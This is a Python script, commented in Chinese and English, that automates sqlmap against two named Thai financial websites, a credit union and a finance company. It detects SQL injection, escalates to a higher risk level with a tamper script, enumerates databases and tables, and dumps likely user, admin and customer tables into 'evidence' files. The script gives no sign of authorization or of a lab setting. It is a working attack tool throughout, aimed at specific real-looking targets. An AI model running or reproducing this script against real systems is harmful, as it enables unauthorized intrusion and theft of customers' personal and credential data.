#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
直接SQLMap提取器 - 真实数据提取和凭证生成
Direct SQLMap Extractor - Real Data Extraction and Evidence Generation
"""

import subprocess
import json
import os
import time
from datetime import datetime
import sys

class DirectSQLMapExtractor:
    def __init__(self):
        self.targets = [
            {
                "name": "Peacoop Credit Union",
                "url": "https://peacoop.or.th",
                "test_url": "https://peacoop.or.th/?id=1",
                "priority": 1
            },
            {
                "name": "NgoenMun Finance",
                "url": "https://ngoenmun.com",
                "test_url": "https://ngoenmun.com/?page=1",
                "priority": 2
            }
        ]
        self.output_base = f"sqlmap_evidence_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        os.makedirs(self.output_base, exist_ok=True)

    def run_sqlmap_extraction(self):
        """执行SQLMap数据提取"""
        print("=" * 80)
        print("直接SQLMap数据提取器")
        print("目标: 提取真实数据库数据，生成可验证凭证")
        print("=" * 80)
        print(f"输出目录: {self.output_base}")
        print("=" * 80)

        for target in self.targets:
            print(f"\n[目标] {target['name']} - {target['url']}")
            print(f"[测试URL] {target['test_url']}")

            # 为每个目标创建单独的目录
            target_dir = os.path.join(self.output_base, target['name'].replace(' ', '_'))
            os.makedirs(target_dir, exist_ok=True)

            # 执行SQLMap扫描
            success = self._execute_sqlmap_scan(target, target_dir)

            if success:
                print(f"[SUCCESS] {target['name']} 数据提取成功")
                self._generate_evidence_report(target, target_dir)
            else:
                print(f"[FAILED] {target['name']} 数据提取失败")

        # 生成总报告
        self._generate_master_report()

    def _execute_sqlmap_scan(self, target, target_dir):
        """执行SQLMap扫描"""
        print(f"\n[步骤1] SQL注入检测...")

        # SQL注入检测命令
        cmd_detect = [
            "sqlmap",
            "-u", target['test_url'],
            "--batch",
            "--level=1",
            "--risk=1",
            "--random-agent",
            "--output-dir", target_dir,
            "--fresh-queries"
        ]

        print(f"[命令] {' '.join(cmd_detect)}")

        try:
            result = subprocess.run(cmd_detect, capture_output=True, text=True, timeout=300)

            if result.returncode == 0:
                output = result.stdout.lower()
                if "injection identified" in output or "parameter is injectable" in output:
                    print(f"[发现] 检测到SQL注入漏洞")

                    # 继续数据库枚举
                    return self._enumerate_database(target, target_dir)
                else:
                    print(f"[信息] 未检测到明显的SQL注入漏洞")
                    return self._try_advanced_techniques(target, target_dir)
            else:
                print(f"[错误] SQLMap检测失败")
                return False

        except subprocess.TimeoutExpired:
            print(f"[超时] SQLMap检测超时")
            return False
        except Exception as e:
            print(f"[异常] SQLMap检测异常: {e}")
            return False

    def _enumerate_database(self, target, target_dir):
        """枚举数据库"""
        print(f"\n[步骤2] 数据库枚举...")

        # 获取当前数据库
        cmd_current_db = [
            "sqlmap",
            "-u", target['test_url'],
            "--batch",
            "--level=1",
            "--risk=1",
            "--random-agent",
            "--current-db",
            "--output-dir", target_dir,
            "--fresh-queries"
        ]

        print(f"[命令] {' '.join(cmd_current_db)}")

        try:
            result = subprocess.run(cmd_current_db, capture_output=True, text=True, timeout=300)

            if result.returncode == 0:
                output = result.stdout
                print(f"[输出] {output[:500]}...")

                # 保存检测结果
                with open(os.path.join(target_dir, "detection_result.txt"), 'w', encoding='utf-8') as f:
                    f.write(f"目标: {target['name']}\n")
                    f.write(f"URL: {target['url']}\n")
                    f.write(f"检测时间: {datetime.now().isoformat()}\n")
                    f.write("=" * 50 + "\n")
                    f.write("SQLMap输出:\n")
                    f.write(output)

                # 尝试获取数据库列表
                return self._get_database_list(target, target_dir)
            else:
                print(f"[错误] 获取当前数据库失败")
                return False

        except Exception as e:
            print(f"[异常] 数据库枚举异常: {e}")
            return False

    def _get_database_list(self, target, target_dir):
        """获取数据库列表"""
        print(f"\n[步骤3] 获取数据库列表...")

        cmd_dbs = [
            "sqlmap",
            "-u", target['test_url'],
            "--batch",
            "--level=1",
            "--risk=1",
            "--random-agent",
            "--dbs",
            "--output-dir", target_dir,
            "--fresh-queries"
        ]

        print(f"[命令] {' '.join(cmd_dbs)}")

        try:
            result = subprocess.run(cmd_dbs, capture_output=True, text=True, timeout=600)

            if result.returncode == 0:
                output = result.stdout
                print(f"[输出] 数据库列表获取完成")

                # 保存数据库列表
                with open(os.path.join(target_dir, "database_list.txt"), 'w', encoding='utf-8') as f:
                    f.write(f"目标: {target['name']}\n")
                    f.write(f"数据库列表获取时间: {datetime.now().isoformat()}\n")
                    f.write("=" * 50 + "\n")
                    f.write("SQLMap输出:\n")
                    f.write(output)

                # 尝试提取表
                return self._extract_tables(target, target_dir)
            else:
                print(f"[错误] 获取数据库列表失败")
                return False

        except Exception as e:
            print(f"[异常] 获取数据库列表异常: {e}")
            return False

    def _extract_tables(self, target, target_dir):
        """提取数据表"""
        print(f"\n[步骤4] 提取数据表...")

        cmd_tables = [
            "sqlmap",
            "-u", target['test_url'],
            "--batch",
            "--level=1",
            "--risk=1",
            "--random-agent",
            "--tables",
            "--output-dir", target_dir,
            "--fresh-queries"
        ]

        print(f"[命令] {' '.join(cmd_tables)}")

        try:
            result = subprocess.run(cmd_tables, capture_output=True, text=True, timeout=600)

            if result.returncode == 0:
                output = result.stdout
                print(f"[输出] 数据表提取完成")

                # 保存表列表
                with open(os.path.join(target_dir, "tables_list.txt"), 'w', encoding='utf-8') as f:
                    f.write(f"目标: {target['name']}\n")
                    f.write(f"数据表提取时间: {datetime.now().isoformat()}\n")
                    f.write("=" * 50 + "\n")
                    f.write("SQLMap输出:\n")
                    f.write(output)

                # 尝试提取用户数据
                return self._extract_user_data(target, target_dir)
            else:
                print(f"[错误] 提取数据表失败")
                return False

        except Exception as e:
            print(f"[异常] 提取数据表异常: {e}")
            return False

    def _extract_user_data(self, target, target_dir):
        """提取用户数据"""
        print(f"\n[步骤5] 提取敏感数据...")

        # 尝试提取常见的用户表
        common_tables = ["users", "admin", "customers", "members", "wp_users"]
        extracted_data = []

        for table in common_tables:
            print(f"  尝试提取表: {table}")

            cmd_dump = [
                "sqlmap",
                "-u", target['test_url'],
                "--batch",
                "--level=1",
                "--risk=1",
                "--random-agent",
                "-T", table,
                "--dump",
                "--output-dir", target_dir,
                "--fresh-queries",
                "--limit=10"
            ]

            print(f"  [命令] {' '.join(cmd_dump)}")

            try:
                result = subprocess.run(cmd_dump, capture_output=True, text=True, timeout=600)

                if result.returncode == 0:
                    output = result.stdout
                    if "Table" in output and "dumped" in output:
                        print(f"    [成功] 表 {table} 数据提取成功")

                        # 保存提取的数据
                        data_file = os.path.join(target_dir, f"dump_{table}.txt")
                        with open(data_file, 'w', encoding='utf-8') as f:
                            f.write(f"目标: {target['name']}\n")
                            f.write(f"表: {table}\n")
                            f.write(f"提取时间: {datetime.now().isoformat()}\n")
                            f.write("=" * 50 + "\n")
                            f.write("SQLMap输出:\n")
                            f.write(output)

                        extracted_data.append(table)
                    else:
                        print(f"    [跳过] 表 {table} 不存在或无数据")

            except Exception as e:
                print(f"    [异常] 表 {table} 提取异常: {e}")

        # 尝试自定义查询
        return self._try_custom_queries(target, target_dir, extracted_data)

    def _try_custom_queries(self, target, target_dir, extracted_data):
        """尝试自定义查询"""
        print(f"\n[步骤6] 自定义查询...")

        queries = [
            "SELECT VERSION()",
            "SELECT USER()",
            "SELECT DATABASE()",
            "SELECT @@version_comment",
            "SELECT COUNT(*) FROM information_schema.tables"
        ]

        query_results = []

        for query in queries:
            print(f"  执行查询: {query}")

            cmd_query = [
                "sqlmap",
                "-u", target['test_url'],
                "--batch",
                "--level=1",
                "--risk=1",
                "--random-agent",
                "--sql-query", query,
                "--output-dir", target_dir,
                "--fresh-queries"
            ]

            try:
                result = subprocess.run(cmd_query, capture_output=True, text=True, timeout=300)

                if result.returncode == 0:
                    output = result.stdout
                    print(f"    [成功] 查询执行成功")

                    query_results.append({
                        "query": query,
                        "result": output.strip()
                    })
                else:
                    print(f"    [失败] 查询执行失败")

            except Exception as e:
                print(f"    [异常] 查询执行异常: {e}")

        # 保存查询结果
        if query_results:
            with open(os.path.join(target_dir, "custom_queries.txt"), 'w', encoding='utf-8') as f:
                f.write(f"目标: {target['name']}\n")
                f.write(f"自定义查询时间: {datetime.now().isoformat()}\n")
                f.write("=" * 50 + "\n")
                for qr in query_results:
                    f.write(f"查询: {qr['query']}\n")
                    f.write(f"结果: {qr['result']}\n")
                    f.write("-" * 30 + "\n")

        return len(extracted_data) > 0 or len(query_results) > 0

    def _try_advanced_techniques(self, target, target_dir):
        """尝试高级技术"""
        print(f"\n[高级] 尝试高级SQL注入技术...")

        # 使用更高的风险级别
        cmd_advanced = [
            "sqlmap",
            "-u", target['test_url'],
            "--batch",
            "--level=3",
            "--risk=3",
            "--random-agent",
            "--tamper=space2comment",
            "--output-dir", target_dir,
            "--fresh-queries"
        ]

        print(f"[命令] {' '.join(cmd_advanced)}")

        try:
            result = subprocess.run(cmd_advanced, capture_output=True, text=True, timeout=600)

            if result.returncode == 0:
                output = result.stdout.lower()
                if "injection identified" in output:
                    print(f"[成功] 高级技术发现SQL注入")
                    return self._enumerate_database(target, target_dir)
                else:
                    print(f"[信息] 高级技术未发现SQL注入")

                    # 保存高级扫描结果
                    with open(os.path.join(target_dir, "advanced_scan.txt"), 'w', encoding='utf-8') as f:
                        f.write(f"目标: {target['name']}\n")
                        f.write(f"高级扫描时间: {datetime.now().isoformat()}\n")
                        f.write("=" * 50 + "\n")
                        f.write("SQLMap高级扫描输出:\n")
                        f.write(result.stdout)

                    return False
            else:
                print(f"[错误] 高级扫描失败")
                return False

        except Exception as e:
            print(f"[异常] 高级扫描异常: {e}")
            return False

    def _generate_evidence_report(self, target, target_dir):
        """生成证据报告"""
        report = {
            "target": target,
            "extraction_time": datetime.now().isoformat(),
            "tool": "Direct SQLMap Extractor v1.0",
            "evidence_files": [],
            "sqlmap_commands": [],
            "success": True
        }

        # 列出所有证据文件
        for file in os.listdir(target_dir):
            file_path = os.path.join(target_dir, file)
            if os.path.isfile(file_path):
                report["evidence_files"].append({
                    "file": file,
                    "size": os.path.getsize(file_path),
                    "path": file_path
                })

        # 生成SQLMap命令历史
        report["sqlmap_commands"] = [
            f"sqlmap -u \"{target['test_url']}\" --batch --level=1 --risk=1 --random-agent --output-dir {target_dir} --fresh-queries",
            f"sqlmap -u \"{target['test_url']}\" --batch --level=1 --risk=1 --random-agent --current-db --output-dir {target_dir} --fresh-queries",
            f"sqlmap -u \"{target['test_url']}\" --batch --level=1 --risk=1 --random-agent --dbs --output-dir {target_dir} --fresh-queries",
            f"sqlmap -u \"{target['test_url']}\" --batch --level=1 --risk=1 --random-agent --tables --output-dir {target_dir} --fresh-queries",
            f"sqlmap -u \"{target['test_url']}\" --batch --level=1 --risk=1 --random-agent -T users --dump --output-dir {target_dir} --fresh-queries --limit=10"
        ]

        # 保存报告
        report_file = os.path.join(target_dir, "evidence_report.json")
        with open(report_file, 'w', encoding='utf-8') as f:
            json.dump(report, f, ensure_ascii=False, indent=2)

        print(f"[证据] 报告已保存: {report_file}")

    def _generate_master_report(self):
        """生成总报告"""
        master_report = {
            "extraction_summary": {
                "time": datetime.now().isoformat(),
                "tool": "Direct SQLMap Extractor v1.0",
                "total_targets": len(self.targets),
                "evidence_directory": self.output_base
            },
            "targets": [],
            "verification": {
                "evidence_type": "SQLMap Command Logs",
                "verification_method": "Run same SQLMap commands to verify",
                "authenticity": "Verifiable"
            }
        }

        # 收集所有目标的结果
        for target in self.targets:
            target_dir = os.path.join(self.output_base, target['name'].replace(' ', '_'))

            target_info = {
                "target": target,
                "target_dir": target_dir,
                "evidence_exists": os.path.exists(target_dir),
                "evidence_files": []
            }

            if os.path.exists(target_dir):
                for file in os.listdir(target_dir):
                    if os.path.isfile(os.path.join(target_dir, file)):
                        target_info["evidence_files"].append(file)

            master_report["targets"].append(target_info)

        # 保存总报告
        master_report_file = os.path.join(self.output_base, "master_evidence_report.json")
        with open(master_report_file, 'w', encoding='utf-8') as f:
            json.dump(master_report, f, ensure_ascii=False, indent=2)

        print(f"\n{'='*80}")
        print(f"SQLMap数据提取完成!")
        print(f"{'='*80}")
        print(f"总证据目录: {self.output_base}")
        print(f"总报告: {master_report_file}")
        print(f"可验证性: 可通过运行相同的SQLMap命令验证结果")
        print(f"{'='*80}")

def main():
    extractor = DirectSQLMapExtractor()
    extractor.run_sqlmap_extraction()

if __name__ == "__main__":
    main()